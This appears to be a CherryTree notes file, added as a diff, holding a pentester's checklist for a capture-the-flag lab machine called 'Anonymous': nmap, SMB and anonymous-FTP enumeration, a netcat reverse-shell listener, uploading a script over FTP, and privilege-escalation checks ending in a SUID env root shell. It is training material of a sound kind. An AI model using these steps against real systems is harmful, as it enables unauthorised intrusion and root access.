@@ -1,0 +1,93 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node name="Anonymous" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1692559590" ts_lastsave="1692563215">
+    <rich_text weight="heavy">Enumeration</rich_text>
+    <rich_text>
+	</rich_text>
+    <rich_text underline="single">Port Enumeration</rich_text>
+    <rich_text>
+					nmap -sC -sV -Pn -n -vv 10.10.214.138 		-		Service and Version scan of 1000 ports with no ping scan and dns resolution
+	
+	</rich_text>
+    <rich_text underline="single">SMB Enumeration</rich_text>
+    <rich_text>
+			</rich_text>
+    <rich_text underline="single">listing shares</rich_text>
+    <rich_text>
+					smbclient -L \\10.10.214.138
+			
+			</rich_text>
+    <rich_text underline="single">connecting to the share</rich_text>
+    <rich_text>			
+					smbclient \\\\10.10.214.138\\pics
+			
+	</rich_text>
+    <rich_text underline="single">FTP Enumeration</rich_text>
+    <rich_text>
+			</rich_text>
+    <rich_text underline="single">ftp-anon</rich_text>
+    <rich_text>
+					ftp 10.10.214.138 21
+					
+
+</rich_text>
+    <rich_text weight="heavy">Exploitation</rich_text>
+    <rich_text>
+	</rich_text>
+    <rich_text underline="single">reverse shell</rich_text>
+    <rich_text>
+					nc -nlvp 4444
+
+	</rich_text>
+    <rich_text underline="single">ftp-file upload</rich_text>
+    <rich_text>
+					put clean.sh
+					
+</rich_text>
+    <rich_text weight="heavy">Post Exploitation</rich_text>
+    <rich_text>
+	</rich_text>
+    <rich_text underline="single">shell stabilization</rich_text>
+    <rich_text>
+			</rich_text>
+    <rich_text underline="single">python</rich_text>
+    <rich_text>
+					python3 -c ‘import pty;pty.spawn("/bin/bash")’
+	
+	</rich_text>
+    <rich_text underline="single">privilege escalation</rich_text>
+    <rich_text>
+			</rich_text>
+    <rich_text underline="single">sudo permissions</rich_text>
+    <rich_text>
+					sudo -l
+					sudo -ll
+			
+			</rich_text>
+    <rich_text underline="single">passwd file permissions</rich_text>
+    <rich_text>
+					ls -l /etc/passwd			
+					
+			</rich_text>
+    <rich_text underline="single">cron file check</rich_text>
+    <rich_text>
+					cat /etc/crontab
+					
+			</rich_text>
+    <rich_text underline="single">file with suid bit set</rich_text>
+    <rich_text>
+					find / -type f -perm -4000 2&gt;/dev/null
+					gtfo bins
+					
+			</rich_text>
+    <rich_text underline="single">/bin/env</rich_text>
+    <rich_text>
+					/usr/bin/env /bin/sh -p
+	
+					
+
+
+	
+			</rich_text>
+  </node>
+</cherrytree>
